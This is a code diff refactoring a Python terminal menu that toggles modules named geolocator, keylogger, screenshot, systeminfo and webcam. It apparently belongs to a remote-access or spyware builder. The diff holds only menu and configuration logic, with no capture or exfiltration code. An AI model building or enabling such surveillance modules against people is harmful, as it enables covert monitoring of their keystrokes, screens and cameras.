@@ -1,15 +1,13 @@
 from configuration import configpar as cp
 from common import cprinter, cmenu
 import main_menu
-from resources import constant
-from common import cginput
 
-menu_string = """\033[92m[tools_menu]\033[0m
+menu_str = """\033[92m[tools_menu]\033[0m
 modules running:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~
 {}~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-[0] back to main menu
+[q] back to main menu
 
 """
 
@@ -33,35 +31,26 @@ def format_tool(tool_key, num):
 
 
 def show():
-    pr = cprinter.Printer()
-    updated = load_tools_values()
-    toolsMenu = cmenu.Menu(menu_string.format(load_tools_values()), [0, 1, 2, 3, 4, 5])
+    tools_menu = cmenu.Menu(menu_str.format(load_tools_values()))
+    switcher = {
+        '1': lambda: cp.config_switch_key('tools', 'geolocator'),
+        '2': lambda: cp.config_switch_key('tools', 'keylogger'),
+        '3': lambda: cp.config_switch_key('tools', 'screenshot'),
+        '4': lambda: cp.config_switch_key('tools', 'systeminfo'),
+        '5': lambda: cp.config_switch_key('tools', 'webcam'),
+        'q': main_menu.show
+    }
 
-    pr.clean_terminal()
-    toolsMenu.show_menu()
-    option = toolsMenu.read_input()
+    tools_menu.set_switcher(switcher)
 
+    tools_menu.clean_terminal()
+    tools_menu.show_menu()
+    option = tools_menu.read_input()
+    while option != 'q':
+        tools_menu.switch(option)
+        tools_menu.clean_terminal()
+        tools_menu.set_menu(menu_str.format(load_tools_values()))
+        tools_menu.show_menu()
+        option = tools_menu.read_input()
 
-    while not toolsMenu.is_a_valid_option(option):
-        pr.error("That module doesn't exist")
-        option = toolsMenu.read_input()
-    while option != 0:
-        if option == constant.GEOLOCATION:
-            cp.config_switch_key('tools', 'geolocator')
-            show()
-        if option == constant.KEYLOGGER:
-            cp.config_switch_key('tools', 'keylogger')
-            show()
-        if option == constant.SCREENSHOT:
-            cp.config_switch_key('tools', 'screenshot')
-            show()
-        if option == constant.SYSTEMINFO:
-            cp.config_switch_key('tools', 'systeminfo')
-            show()
-        if option == constant.WEBCAM:
-            cp.config_switch_key('tools', 'webcam')
-            show()
-    if option == constant.MAIN_MENU:
-        main_menu.show()
-        exit()
 
